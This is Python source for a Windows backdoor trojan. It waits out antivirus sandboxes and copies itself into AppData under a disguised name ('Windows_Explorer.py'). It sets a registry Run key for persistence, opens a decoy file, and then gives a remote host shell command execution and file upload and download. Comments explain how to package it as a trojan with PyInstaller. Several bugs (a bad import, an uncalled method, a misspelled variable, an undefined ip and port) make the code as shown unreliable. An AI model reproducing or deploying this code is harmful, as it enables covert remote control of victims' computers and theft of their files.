#!/usr/bin/python3

import socket.socket, subprocess, json, os, base64, sys, shutil, time

class Sleep:
    def __init__(self):
        x = 1
        while x < 1000:
            y = x
            x = x + 1
        time.sleep(60)
        #using this class becuase. in this class's running time we can bypass most antivirus sandbox tests

class Backdoor:
    def __init__(self, ip, port):
        self.become_presistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_presistent(self):
        #for windows. if this file executable then you should put sys.executable in copyfile source, otherwise __file__ ok with python file
        file_location = os.environ["appdata"] + "\\Windows_Explorer.py" #if it's executable file then you should change the extension
        if not os.path.exists(file_location):
            self.display_file()
            shutil.copyfile(__file__, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)

    def display_file(self):
        #if you want to create trojan then you must convert py file to executable, we can use a tool called pyinstaller to convert executable and so more
        front_file = sys._MEIPASS + ""
        #sys._MEIPASS access the location of file which you used in pyinstaller, then put file name whatever you want after \
        #when you have to compile this code to another file as trojan you want to compile with a tool called pyinstaller
        #full path of pyinstaller.exe --add-data "full path of the file that you want to show victim;." --onefile --noconsole --icon "full path of the icon for the file" file_name.py
        subprocess.Popen(front_file, shell=True)

    def execute_command(self, command):
        devnull = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=devnull, stdin=devnull)

    def send_data(self, command):
        json_data = json.dumps(command)
        self.connection.send(json_data)

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Working directory changed to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successfully completed."

    def run(self):
        while True:
            command = self.receive_data
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 1:
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_command(comand)
            except Exception:
                command_result = "[-] Error during command execution"
            self.send_data(command_result)


hey_picasso = Sleep()

try:
    my_backdoor = Backdoor(ip, port)
    my_backdoor.run()
except Exception:
    sys.exit()